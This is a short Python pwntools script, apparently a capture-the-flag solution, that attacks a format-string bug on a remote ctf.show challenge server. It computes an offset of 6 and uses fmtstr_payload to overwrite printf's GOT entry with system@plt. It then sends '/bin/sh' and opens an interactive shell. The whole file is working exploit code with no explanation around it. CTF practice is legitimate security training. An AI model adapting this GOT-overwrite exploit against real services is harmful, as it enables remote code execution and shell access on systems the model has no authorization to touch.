from pwn import *
context.log_level = 'debug'
#io = process('./fmt')
io = remote('pwn.challenge.ctf.show',28124)
elf = ELF('./pwn')
offset = 6
printf_got = elf.got['printf']
system_plt = elf.plt['system']
payload = fmtstr_payload(offset,{printf_got:system_plt})
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()